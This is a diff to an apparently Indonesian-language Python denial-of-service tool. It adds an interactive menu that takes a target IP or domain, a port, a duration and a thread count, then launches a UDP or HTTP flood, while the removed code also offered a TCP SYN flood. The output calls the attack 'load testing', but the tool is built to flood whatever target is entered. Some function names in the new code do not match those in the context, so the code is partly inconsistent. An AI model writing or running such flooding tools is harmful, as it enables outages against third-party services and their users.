@@ -103,19 +103,70 @@ async def http_flood_attack(target_ip, target_port, duration):
 
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}.")
 
+# ====================== MAIN ======================
+def main():
+    banner()
+
+    print(f"{Fore.CYAN}┏━━ Target Configuration ━━⬣")
+    target_input = input(f"{Fore.CYAN}┗> Target IP / Domain : {Fore.WHITE}")
+    try:
+        ip = socket.gethostbyname(target_input)
+        print(f"{Fore.GREEN}[!] Resolved {target_input} to {ip}")
+    except socket.gaierror:
+        print(f"{Fore.RED}[!] Gagal mendapatkan IP dari domain tersebut.")
+        sys.exit()
+
+    try:
+        port = int(input(f"{Fore.CYAN}┗> Port               : {Fore.WHITE}"))
+    except:
+        print(f"{Fore.RED}Port tidak valid!")
+        sys.exit()
+
+    try:
+        duration = int(input(f"{Fore.CYAN}┗> Duration (detik)   : {Fore.WHITE}"))
+        if duration > 300:
+            duration = 300
+            print(f"{Fore.YELLOW}[!] Durasi dibatasi maksimal 300 detik.")
+    except:
+        print(f"{Fore.RED}Durasi tidak valid!")
+        sys.exit()
+
+    print(f"\n{Fore.CYAN}┏━━ Attack Type ━━⬣")
+    print(f"   {Fore.WHITE}[1] UDP Flood")
+    print(f"   {Fore.WHITE}[2] HTTP Flood")
+    attack_type = input(f"{Fore.CYAN}┗> Pilih (1/2)         : {Fore.WHITE}")
+
+    confirm = input(f"\n{Fore.RED}Ketik {Fore.WHITE}'YA' {Fore.RED}untuk memulai attack: {Fore.WHITE}")
+    if confirm.upper() != "YA":
+        print(f"{Fore.RED}Dibatalkan.")
+        sys.exit()
+
+    try:
+        threads = int(input(f"\n{Fore.CYAN}Jumlah Threads (10-400) : {Fore.WHITE}"))
+        threads = max(10, min(threads, 400))
+    except:
+        threads = 150
+
+    global packet_count
+    packet_count = 0
+    start_time = time.time()
+
+    print(f"\n{Fore.GREEN}{'═' * 60}")
+    print(f"           LOAD TESTING DIMULAI - LOGS ACTIVE")
+    print(f"{'═' * 60}\n")
+
+    try:
+        if attack_type == "1":
+            udp_flood(ip, port, duration, threads)
+        elif attack_type == "2":
+            http_flood(ip, port, duration, threads)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        elapsed = int(time.time() - start_time)
+        print(f"\n{Fore.GREEN}[✓] Load Testing selesai dalam {elapsed} detik.")
+        print(f"{Fore.CYAN}Total packets sent : {Fore.WHITE}{packet_count:,}")
+        print(f"{Fore.CYAN}Terima kasih telah menggunakan tool ini.")
+
 if __name__ == "__main__":
-    display_banner()
-    target_ip, target_port, duration, attack_type = parse_arguments()
-
-    if not check_target_availability(target_ip, target_port):
-        sys.exit(1)
-
-    if attack_type == 'UDP':
-        udp_attack(target_ip, target_port, duration)
-    if attack_type == 'TCP':
-        tcp_syn_attack(target_ip, target_port, duration)
-    if attack_type == 'HTTP':
-        asyncio.run(http_flood_attack(target_ip, target_port, duration))
-
-if __name__ == "__main__":
-    ("main")
+    main()
